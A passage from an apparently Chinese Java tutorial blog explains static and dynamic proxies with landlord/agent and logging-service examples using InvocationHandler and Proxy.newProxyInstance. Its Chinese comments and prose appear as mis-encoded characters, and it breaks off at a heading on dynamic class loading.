class_">Rent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//æˆ¿ä¸œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//æˆ¿ä¸œè¦ç§Ÿæˆ¿å­</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//ä»£ç†ï¼Œä¸­ä»‹å¸®æˆ¿ä¸œç§Ÿæˆ¿å­ï¼Œä½†æ˜¯ä»£ç†ä¼šæœ‰ä¸€äº›é™„å±æ“ä½œ</span><br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);<br>        <span class="hljs-comment">//ä½ ä¸ç”¨é¢å¯¹æˆ¿ä¸œï¼Œç›´æ¥æ‰¾ä¸­ä»‹ç§Ÿæˆ¿å­</span><br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-keyword">private</span> Host  host;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span> &#123;<br>        <span class="hljs-built_in">this</span>.host = host;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        host.rent();<br>        seeHouse();<br>        fare();<br>        hetong();<br>    &#125;<br><br>    <span class="hljs-comment">//çœ‹æˆ¿</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//æ”¶ä¸­ä»‹è´¹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹æ”¶å–ä¸­ä»‹è´¹&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//ç­¾ç§ŸèµåˆåŒ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hetong</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹ç­¾ç§ŸèµåˆåŒ&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png"></p><p>å¦ä¸€ä¾‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-comment">//çœŸå®å¯¹è±¡</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¿®æ”¹äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;add&quot;</span>);<br>        userService.add();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;delete&quot;</span>);<br>        userService.delete();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;update&quot;</span>);<br>        userService.update();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;query&quot;</span>);<br>        userService.query();<br>    &#125;<br><br>    <span class="hljs-comment">//æ—¥å¿—æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Debug] ä½¿ç”¨äº†&quot;</span>+msg+<span class="hljs-string">&quot;æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//ä»£ç†ç±»</span><br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();<br>        <span class="hljs-comment">//ä½¿ç”¨ä»£ç†ç±»å®ç°æ—¥å¿—åŠŸèƒ½ï¼</span><br>        proxy.setUserService(userService);<br>        proxy.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(255, 0, 0);">åœ¨ä¸æ”¹å˜åŸæ¥çš„ä»£ç çš„æƒ…å†µä¸‹ï¼Œå®ç°äº†å¯¹åŸæœ‰åŠŸèƒ½çš„å¢å¼ºï¼Œè¿™æ˜¯AOPä¸­æœ€æ ¸å¿ƒçš„æ€æƒ³</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png"></p><h2 id="3-2-åŠ¨æ€ä»£ç†"><a href="#3-2-åŠ¨æ€ä»£ç†" class="headerlink" title="3.2 åŠ¨æ€ä»£ç†"></a>3.2 åŠ¨æ€ä»£ç†</h2><ul><li>åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†è§’è‰²ä¸€æ ·</li><li>åŠ¨æ€ä»£ç†çš„ä»£ç†ç±»æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œä¸æ˜¯æˆ‘ä»¬ç›´æ¥å†™å¥½çš„</li><li>åŠ¨æ€ä»£ç†åˆ†ä¸ºä¿©å¤§ç±»ï¼šåŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†ï¼ŒåŸºäºç±»çš„åŠ¨æ€ä»£ç†<ul><li>åŸºäºæ¥å£â€“JDK åŠ¨æ€ä»£ç†</li><li>åŸºäºç±»â€“cglib</li><li>java å­—èŠ‚ç å®ç°ï¼šjavasist</li></ul></li></ul><p><font style="color:#080808;background-color:#ffffff;">äº†è§£ä¿©ä¸ªç±»ï¼š</font></p><ul><li>Proxyï¼šä»£ç†</li><li><font style="color:#080808;background-color:#ffffff;">InvocationHandlerï¼šè°ƒç”¨å¤„ç†ç¨‹åº</font></li></ul><p><strong><font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">åŠ¨æ€ä»£ç†çš„å¥½å¤„</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">é™æ€ä»£ç†æœ‰çš„å®ƒéƒ½æœ‰ï¼Œé™æ€ä»£ç†æ²¡æœ‰çš„ï¼Œå®ƒä¹Ÿæœ‰ï¼</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">å¯ä»¥ä½¿å¾—æˆ‘ä»¬çš„çœŸå®è§’è‰²æ›´åŠ çº¯ç²¹ . ä¸å†å»å…³æ³¨ä¸€äº›å…¬å…±çš„äº‹æƒ… .</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">å…¬å…±çš„ä¸šåŠ¡ç”±ä»£ç†æ¥å®Œæˆ . å®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥ ,</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•æ—¶å˜å¾—æ›´åŠ é›†ä¸­å’Œæ–¹ä¾¿ .</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">ä¸€ä¸ªåŠ¨æ€ä»£ç† , ä¸€èˆ¬ä»£ç†æŸä¸€ç±»ä¸šåŠ¡</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯ä»¥ä»£ç†å¤šä¸ªç±»ï¼Œä»£ç†çš„æ˜¯æ¥å£ï¼</font></li></ul><p>æ¡ˆä¾‹ä¸€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//æˆ¿ä¸œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//ç§Ÿæˆ¿</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//ä½¿ç”¨æ­¤ç±»è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//è¢«ä»£ç†çš„æ¥å£</span><br>    <span class="hljs-keyword">private</span> Rent rent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRent</span><span class="hljs-params">(Rent rent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rent = rent;<br>    &#125;<br><br>    <span class="hljs-comment">//ç”Ÿæˆå¾—åˆ°ä»£ç†ç±»</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      rent.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤„ç†ä»£ç†å®ä¾‹ï¼Œå¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//åŠ¨æ€ä»£ç†çš„æœ¬è´¨ï¼Œå°±æ˜¯ä½¿ç”¨åå°„æœºåˆ¶å®ç°</span><br>        seeHouse();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(rent, args);<br>        <span class="hljs-comment">//return method.invoke(rent, args);</span><br>        fare();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹å¸¦çœ‹æˆ¿å­&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ”¶ä¸­ä»‹è´¹&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//çœŸå®è§’è‰²</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//ä»£ç†è§’è‰²ï¼Œç°åœ¨æ²¡æœ‰</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//é€šè¿‡è°ƒç”¨ç¨‹åºå¤„ç†è§’è‰²æ¥å¤„ç†æˆ‘ä»¬è¦è°ƒç”¨çš„æ¥å£å¯¹è±¡</span><br>        pih.setRent(host);<br>        <span class="hljs-type">Rent</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Rent) pih.getProxy();<br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¡ˆä¾‹äºŒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//ä½¿ç”¨æ­¤ç±»è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//è¢«ä»£ç†çš„æ¥å£</span><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">//ç”Ÿæˆå¾—åˆ°ä»£ç†ç±»</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      target.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤„ç†ä»£ç†å®ä¾‹ï¼Œå¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method.getName());<br>        <span class="hljs-comment">//åŠ¨æ€ä»£ç†çš„æœ¬è´¨ï¼Œå°±æ˜¯ä½¿ç”¨åå°„æœºåˆ¶å®ç°</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰§è¡Œäº†&quot;</span>+msg+<span class="hljs-string">&quot;æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> com.kuang.demo02.UserService;<br><span class="hljs-keyword">import</span> com.kuang.demo02.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//çœŸå®è§’è‰²</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//ä»£ç†è§’è‰²ï¼Œç°åœ¨æ²¡æœ‰p</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//è®¾ç½®ä»£ç†å¯¹è±¡</span><br>        pih.setTarget(userService);<br>        <span class="hljs-comment">//åŠ¨æ€ç”Ÿæˆä»£ç†ç±»</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) pih.getProxy();<br>        proxy.add();<br>        <span class="hljs-comment">//        proxy.delete();</span><br>        <span class="hljs-comment">//        proxy.update();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4ã€ç±»çš„åŠ¨æ€åŠ è½½"><a href="#4ã€ç±»çš„åŠ¨æ€åŠ è½½" class="headerlink" title="4ã€ç±»çš„åŠ¨æ€åŠ è½½"></a>4ã€ç±»çš„åŠ¨æ€åŠ è½½</h1><blockquote><p><font style="color:rgb(33, 37, 41);">Javaç±»åŠ 